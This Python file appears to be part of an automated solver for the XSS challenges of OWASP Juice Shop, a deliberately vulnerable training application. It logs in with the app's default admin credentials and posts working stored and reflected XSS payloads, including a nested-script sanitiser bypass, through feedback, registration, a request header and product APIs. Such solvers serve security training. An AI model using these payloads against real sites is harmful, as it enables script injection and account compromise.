#!/usr/bin/env python3
"""XSS challenges. Several are detected server-side (persisted/stored, header);
the DOM/reflected ones need a browser to fire the alert (see browser.py)."""
from __future__ import annotations

from core import register_solver, Client, ok, warn

CAT = "XSS"
XSS = '<iframe src="javascript:alert(`xss`)">'


# ---- server-side detected ------------------------------------------------- #
@register_solver("persistedXssFeedbackChallenge", "Server-side XSS Protection (feedback)", CAT)
def persisted_feedback(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.add_feedback('<<script>Foo</script>iframe src="javascript:alert(`xss`)">', rating=3)
    ok(f"posted masked-XSS feedback ({r.status_code})")


@register_solver("persistedXssUserChallenge", "Persisted XSS via user email", CAT)
def persisted_user(c: Client):
    r = c.s.post(c.url("/api/Users"),
                 json={"email": XSS, "password": "xss12345",
                       "passwordRepeat": "xss12345",
                       "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                 headers={"Content-Type": "application/json"}, timeout=30, verify=False)
    ok(f"registered user with XSS email ({r.status_code})")


@register_solver("httpHeaderXssChallenge", "HTTP-Header XSS (True-Client-IP)", CAT)
def http_header_xss(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.get("/rest/saveLoginIp", headers={"True-Client-IP": XSS})
    ok(f"stored XSS via True-Client-IP header ({r.status_code})")


# ---- injection performed via API; alert fires in a browser ---------------- #
@register_solver("restfulXssChallenge", "API-only XSS (product description)", CAT)
def restful_xss(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.post("/api/Products", json={"name": "RestXSS", "description": XSS, "price": 47.11})
    ok(f"created product carrying XSS ({r.status_code}); view /#/search?q=RestXSS in a browser to fire")


@register_solver("reflectedXssChallenge", "Reflected XSS (order tracking)", CAT)
def reflected_xss(c: Client):
    # payload reflected on the order-tracking result page
    c.get("/rest/track-order/" + XSS)
    warn("reflectedXss fires in the SPA: open /#/track-result/new?id=" + XSS + " in a browser")


# localXss + xssBonus are solved by realtime.py (websocket) - no browser needed.


@register_solver("usernameXssChallenge", "CSP bypass username XSS", CAT)
def username_xss(c: Client):
    warn("usernameXss needs a browser: disarm CSP via profile image URL, then XSS the username field")


@register_solver("videoXssChallenge", "XSS via subtitle/video", CAT)
def video_xss(c: Client):
    warn("videoXss requires uploading a crafted subtitle and playing the promo video in a browser")
